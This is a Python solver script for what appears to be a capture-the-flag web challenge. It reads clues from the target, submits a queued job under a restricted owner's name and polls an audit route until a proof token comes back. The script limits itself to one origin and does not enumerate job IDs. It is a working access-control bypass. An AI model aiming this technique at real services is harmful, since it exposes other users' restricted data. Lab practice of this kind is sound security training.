#!/usr/bin/env python3
"""Solve the assigned queued-owner binding web target from its own clues."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import time
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
USER_AGENT = "HuntressCTF-Web-Inspector/1.0"
PROOF_RE = re.compile(rb"\bproof_[A-Za-z0-9_-]{12,}\b")


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.records: list[dict[str, object]] = []

    def request(
        self,
        route: str,
        *,
        method: str = "GET",
        payload: dict | None = None,
        params: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-target route: {route}")
        if params:
            parts = urlsplit(url)
            query = parts.query
            encoded = urlencode(params)
            url = urlunsplit(
                (parts.scheme, parts.netloc, parts.path, f"{query}&{encoded}" if query else encoded, "")
            )
        body = json.dumps(payload, separators=(",", ":")).encode() if payload is not None else None
        headers = {"User-Agent": USER_AGENT, "Accept": "application/json, */*;q=0.5"}
        if body is not None:
            headers["Content-Type"] = "application/json"
        request = Request(url, data=body, headers=headers, method=method)
        try:
            response = urlopen(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed for {route}: {exc.reason}") from exc
        data = response.read(MAX_BODY_BYTES + 1)
        if len(data) > MAX_BODY_BYTES:
            raise RuntimeError(f"{route} exceeded the 2 MiB response limit")
        filename = (
            f"{len(self.records) + 1:02d}-"
            f"{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
        )
        (self.output_dir / filename).write_bytes(data)
        self.records.append(
            {
                "file": filename,
                "url": url,
                "method": method,
                "status": int(getattr(response, "status", response.code)),
                "bytes": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
            }
        )
        return int(getattr(response, "status", response.code)), data

    @staticmethod
    def parse_json(body: bytes, description: str, status: int) -> dict:
        try:
            value = json.loads(body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise RuntimeError(f"{description} returned invalid JSON (HTTP {status})") from exc
        if not isinstance(value, dict):
            raise RuntimeError(f"{description} returned a non-object JSON value")
        return value

    def clues(self) -> dict:
        status, body = self.request("/api/clues")
        value = self.parse_json(body, "/api/clues", status)
        if status != 200:
            raise RuntimeError(f"/api/clues returned HTTP {status}: {value}")
        for key in ("feature_route", "secondary_route", "owner_directory_route"):
            if not isinstance(value.get(key), str) or not value[key]:
                raise ValueError(f"clues lack a valid {key}")
        return value

    def solve(self, clues: dict) -> tuple[str, dict]:
        owner_status, owner_body = self.request(clues["owner_directory_route"])
        directory = self.parse_json(owner_body, clues["owner_directory_route"], owner_status)
        if owner_status != 200:
            raise RuntimeError(
                f"owner directory returned HTTP {owner_status}: {directory}"
            )
        owner = directory.get("restricted_owner")
        if not isinstance(owner, str) or not owner:
            raise ValueError("owner directory does not disclose restricted_owner")

        # Read the feature's own method contract before submitting its one
        # required field. The returned job ID is then used as-is; no IDs are
        # guessed or enumerated.
        status, contract_body = self.request(clues["feature_route"])
        contract = self.parse_json(contract_body, clues["feature_route"], status)
        required = contract.get("request_fields")
        if status != 405 or contract.get("error") != "post_required":
            raise RuntimeError(
                f"feature did not disclose the expected POST contract: HTTP {status} {contract}"
            )
        if not isinstance(required, list) or "owner" not in required:
            raise ValueError(f"feature's request fields do not include owner: {required}")

        status, queued_body = self.request(
            clues["feature_route"], method="POST", payload={"owner": owner}
        )
        queued = self.parse_json(queued_body, clues["feature_route"], status)
        job_id = queued.get("id")
        if status not in (200, 201) or not isinstance(job_id, (str, int)):
            raise RuntimeError(f"job submission returned HTTP {status}: {queued}")

        for attempt in range(10):
            status, audit_body = self.request(
                clues["secondary_route"], params={"id": str(job_id)}
            )
            audit = self.parse_json(audit_body, clues["secondary_route"], status)
            evidence = audit.get("evidence")
            if status == 200 and isinstance(evidence, str) and PROOF_RE.fullmatch(
                evidence.encode()
            ):
                return evidence, {
                    "technique": "queued_owner_binding",
                    "owner": owner,
                    "job_id": str(job_id),
                    "feature_route": clues["feature_route"],
                    "audit_route": clues["secondary_route"],
                }
            if status not in (202, 404) and audit.get("error") not in {
                "job_pending",
                "not_ready",
            }:
                raise RuntimeError(f"job audit returned HTTP {status}: {audit}")
            if attempt < 9:
                time.sleep(0.5)
        raise RuntimeError(f"job {job_id} did not return proof after bounded polling")

    def save_report(self, clues: dict, proof: str, details: dict) -> Path:
        report = {
            "target": self.target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            **details,
            "proof": proof,
            "responses": self.records,
            "request_policy": {
                "same_origin_only": True,
                "max_response_bytes": MAX_BODY_BYTES,
                "job_id_enumeration": False,
            },
        }
        report_path = self.output_dir / "report.json"
        report_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        return report_path


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", help="exact target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    try:
        target = normalize_url(args.target)
        hostname = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{hostname}-queue-confusion-{timestamp}"
        )
        solver = Solver(target, output_dir)
        clues = solver.clues()
        proof, details = solver.solve(clues)
        report = solver.save_report(clues, proof, details)
        print(json.dumps({"proof": proof, "report": str(report)}, indent=2))
        return 0
    except (OSError, RuntimeError, ValueError) as exc:
        print(json.dumps({"error": str(exc)}))
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
